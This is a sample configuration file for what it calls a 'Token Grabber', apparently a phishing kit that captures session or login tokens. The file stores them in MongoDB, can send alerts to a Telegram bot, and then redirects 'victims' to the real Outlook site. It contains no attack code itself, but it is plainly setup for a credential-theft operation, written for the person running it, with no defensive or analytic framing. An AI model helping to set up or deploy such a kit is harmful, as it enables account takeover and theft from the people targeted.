// Token Grabber Configuration Example
// Copy this file to config.js and update with your settings

module.exports = {
  // License Key (Get from your license provider)
  // Leave empty - will be activated through admin panel on first run
  licenseKey: '',
  
  // Server Port
  port: 8080,
  
  // MongoDB Connection
  mongodbUri: 'mongodb://localhost:27017/token_grabber',
  
  // Telegram Notifications (Optional)
  telegramBotToken: '',  // Get from @BotFather
  telegramChatId: '',    // Your chat ID
  
  // Redirect URL (where victims go after token capture)
  redirectUrl: 'https://outlook.office.com'
};
